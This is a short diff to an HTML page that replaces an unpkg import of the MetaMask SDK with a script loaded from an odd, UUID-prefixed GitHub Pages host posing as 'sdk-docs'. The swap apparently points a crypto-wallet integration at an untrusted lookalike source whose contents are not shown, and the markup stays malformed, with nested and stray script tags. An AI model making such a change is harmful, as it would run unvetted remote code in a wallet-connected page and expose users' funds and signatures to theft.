@@ -1,16 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script type="module" crossorigin>
-    <script type="module" crossorigin>
-    import { MetaMaskSDK } from 'https://unpkg.com/@metamask/sdk@0.31.5/dist/metamask-sdk.esm.js'
-
-    const MMSDK = new MetaMaskSDK({
-        dappMetadata: {
-            name: "Your Dapp Name",
-            url: window.location.href,
-        }
-    })
+   <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+    <script>
+        const MMSDK = new MetaMaskSDK.MetaMaskSDK({
+            dappMetadata: {
+                name: "Your Dapp Name",
+                url: window.location.href,
+            }
+        })
+    </script>
 </script>
   </script>
 </head>
